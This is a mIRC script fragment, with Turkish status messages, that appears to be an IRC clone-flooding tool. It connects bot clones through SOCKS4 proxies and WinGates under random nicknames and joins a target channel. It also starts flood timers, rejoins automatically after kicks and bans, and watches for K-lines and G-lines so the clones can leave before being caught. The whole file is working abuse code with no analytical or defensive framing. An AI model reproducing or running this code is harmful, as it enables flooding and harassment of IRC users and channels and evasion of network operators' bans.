   on *:sockopen:geno.proxy*: {
     if ($sockerr > 0) { return }
     bset &byte 1 4 1 $chr($int($calc($gettok(%geno.server-port,2,32) / 256))) $gettok(%geno.server-port,2,32)  $gettok(%geno.ip.probe,1,46) $gettok(%geno.ip.probe,2,46) $gettok(%geno.ip.probe,3,46) $gettok(%geno.ip.probe,4,46) 0
     sockwrite $sockname &byte
   }
   on *:sockread:geno.proxy*:{
     sockread &info.socks4
     if ($bvar(&info.socks4,2) == 90) {
       sockwrite -tn $sockname USER $read $mircdir $+ user2.txt $rand(a,z) $+ $rand(a,z)  $rand(a,z) $+ $rand(a,z)  $rand(a,z) $+ $rand(a,z)  $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
       sockwrite -tn $sockname NICK $read $mircdir $+ nicks2.txt $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
       sockrename $sockname geno.circ [ $+ [ $ticks ] $+ ] . [ $+ [ $calc($gettok($sock(geno.circ*, $sock(geno.circ*,0)),3,46) + 1) ] ]
     }
   }
   on *:sockopen:geno.wingate*: {
     if ($sockerr > 0) { return }
     sockwrite -tn $sockname %geno.server-port
   }
   on *:sockread:geno.wingate*: {
     sockread %geno.w-info
     if (...Connected isin %geno.w-info) {
       sockwrite -tn $sockname USER $read $mircdir $+ user2.txt $rand(a,z) $+ $rand(a,z)  $rand(a,z) $+ $rand(a,z)  $rand(a,z) $+ $rand(a,z)  $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
       sockwrite -tn $sockname NICK $read $mircdir $+ nicks2.txt $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)$+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
       sockrename $sockname  geno.circ [ $+ [ $ticks ] $+ ] . [ $+ [ $calc($gettok($sock(geno.circ*,$sock(geno.circ*,0)),3,46) + 1) ] ]
     }
     unset %geno.w-info
   }
   on *:sockread:geno.circ*:{
     sockread %geno-cc.info
     var %geno-raw = $gettok(%geno-cc.info,2,32)
     if (%geno-raw == 433) { sockwrite -tn $sockname NICK $read $mircdir $+ nicks2.txt $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) }
     if ( $gettok(%geno-cc.info,1,32) == PING) { sockwrite -tn $sockname PONG %geno-raw }
     if (%geno-raw == 376) {
       sockwrite -tn $sockname Mode $gettok(%geno-cc.info,3,32) %geno.clones.modes
       sockrename $sockname geno.irc [ $+ [ $ticks ] $+ ] . [ $+ [ $calc($gettok($sock(geno.irc*, $sock(geno.irc*,0)),3,46) + 1) ] ]
       if ($gettok(%geno-victim,1,32) == c) && ($timer(geno.flood)) { sockwrite -tn geno.irc* JOIN : [ $+ [ $gettok(%geno-victim,2-,32) ] ] }
     }
     if (K-line isin %geno-cc.info) && (%geno.nomsgok == $null) { Hata.msg ok * "K-line"  :clone servere baðlanamýyor }
     if (G-line isin %geno-cc.info) && (%geno.nomsgok == $null) { Hata.msg ok * "G-line"  :Clone servere baðlanamýyor }
     unset %geno-cc.info
   }
   on *:sockread:geno.irc*:{
     sockread %geno-c.info
     var %geno-raw = $gettok(%geno-c.info,2,32)
     if ( $gettok(%geno-c.info,1,32) == Hata) {
       if (Quit: isin %geno-c.info) { return }
       if (K-line isin %geno-c.info) && (%geno.nomsg == $null) { Hata.msg yn "K-line" uygulanýyor cloneler çýkýyor,yakalanmadan diðerleri çýksýn mý? }
       if (G-line isin %geno-c.info) && (%geno.nomsg == $null) { Hata.msg yn "G-line" uygulanýyor cloneler çýkýyor,yakalanmadan diðerleri çýksýn mý? }
       if (Killed isin %geno-c.info) && (%geno.nomsg == $null) { Hata.msg yn "Killed" uygulanýyor cloneler çýkýyor,yakalanmadan diðerleri çýksýn mý? }
       return
     }
     if ( $gettok(%geno-c.info,1,32) == PING) { sockwrite -tn $sockname PONG %geno-raw }
     if (%geno-raw == KICK) { sockwrite -tn $sockname JOIN $gettok(%geno-c.info,3,32) }
     if (%geno-raw == 474) { if ($sock(geno.birc*,0) == $sock(geno.irc*,0)) && (%geno.bmsg == $null) { info -Bütün Cloneler Banlandý- | info -Her 10 Saniyede bir Tekrar Girilmeye Çalýþýlýyor- |  set %geno.bmsg L | set %geno.genoflood.reps $timer(geno.flood).reps | .timergeno.flood* off }  | if (%geno.genoflood.reps) { sockrename $sockname geno.birc [ $+ [ $ticks ] $+ ] . [ $+ [ $calc($gettok($sock(geno.birc*, [ [ $sock(geno.birc*,0) ] ] ),3,46) + 1) ] ] | if ($timer(grejoin) == $null)  { .timergeno.rejoin -o 0 10 grejoin } } }
     unset %geno-c.info
   }
   alias -l grejoin {
     if ($sock(geno.birc*) == $null) { .timergeno.rejoin off | unset %geno.bmsg | return }
     sockwrite -tn geno.birc* JOIN $gettok(%geno-c.info,3,32)
   }
   on *:sockread:geno.birc*:{
     sockread %geno-bc.info
     var %geno-raw = $gettok(%geno-bc.info,2,32)
     if ($gettok(%geno-bc.info,1,32) == PING) { sockwrite -tn $sockname PONG %geno-raw }
     if (%geno-raw == JOIN) {
       sockrename $sockname geno.irc [ $+ [ $ticks ] $+ ] . [ $+ [ $calc($gettok($sock(geno.irc*, [ [ $sock(geno.irc*,0) ] ] ),3,46) + 1) ] ]
       if ($sock(geno.irc*,0) == 1) || (%geno.genoflood.reps) { .timergeno.flood -o %geno.genoflood.reps $iif($round($calc((%geno.flood.len / 50) * $sock(irc.geno*,0)),0) <= 0 ,$round($calc((%geno.flood.len / 50) * $sock(irc.geno*,0)),0),1) geno.flood  }
     }
   }
